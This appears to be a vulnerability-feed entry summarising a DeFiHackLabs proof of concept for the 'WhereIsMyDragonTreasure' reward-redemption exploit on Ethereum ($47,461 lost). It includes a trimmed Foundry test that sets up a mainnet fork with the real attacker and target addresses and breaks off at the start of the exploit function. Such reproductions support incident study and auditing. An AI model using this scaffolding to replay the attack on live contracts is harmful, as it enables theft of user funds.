# [?] WhereIsMyDragonTreasure - Fixed Reward Redemption

## Summary
Severity: Unknown
Chain: Ethereum
Component: WhereIsMyDragonTreasure
Published: 2025-07-25
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-07/WhereIsMyDragonTreasure_exp.sol
Type: defi-exploit-poc

## Details
Lost: $47,461.35

```solidity
contract ContractTest is BaseTestWithBalanceLog {
    address private constant ATTACKER = 0x8b88A3b92433638324E5f429bEe52b1fd84E7c5a;
    address private constant DRAGON = 0x87AD9009C4Fd0AAa7bFE74f7E00845B3f09aD0CE;
    address private constant TREASURE = 0x32c87193C2cC9961F2283FcA3ca11A483d8E426B;
    IEthItemERC1155 private constant ETH_ITEM = IEthItemERC1155(0xb6ab68A44eCc9fb2244AaB83eB2f6dbA54205EBf);

    address private constant CARD_C2C566 = 0xc2c5667f69E881C83Fc4692f7A08a22370B4cc41;
    address private constant CARD_E63983 = 0xE63983b5FAdE429eC052d1b365826C4Bc5fCB198;
    address private constant CARD_7C23AC = 0x7C23Ac2E8DA915d4f422CF710f4767FAa0c332fa;
    address private constant CARD_A70C86 = 0xA70C8667cCFB63D6b98C2A050c94b7Bf2085dC55;
    address private constant CARD_9B16E7 = 0x9b16e70797276Ae1bE23874961D1E6a9698e1EC6;
    address private constant CARD_88B953 = 0x88B95322b5E93B891D83031F2f55Ca238D5e6417;
    address private constant LEGENDARY_CARD = 0x22e6559F495F97Af51fF56719CdFF80F65a0B93A;

    uint256 private constant FORK_BLOCK = 23_000_243;
    uint256 private constant SINGLE_REWARD = 12_775_839_441_940_405_641;

    function setUp() public {
        vm.createSelectFork("mainnet", FORK_BLOCK);

        fundingToken = address(0);
        attacker = ATTACKER;

        vm.label(ATTACKER, "attacker");
        vm.label(DRAGON, "WhereIsMyDragon");
        vm.label(TREASURE, "WhereIsMyDragonTreasure");
        vm.label(address(ETH_ITEM), "EthItem ERC1155");
        vm.label(LEGENDARY_CARD, "legendary card wrapper");
    }

    function testExploit() public balanceLog {
        (, uint256 singleReward, uint256 startBlock,) = IWhereIsMyDragonTreasure(TREASURE).data();
        assertEq(singleReward, SINGLE_REWARD, "unexpected configured reward");
        assertGe(block.number, startBlock, "redeem period not started");

```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-07/WhereIsMyDragonTreasure_exp.sol_
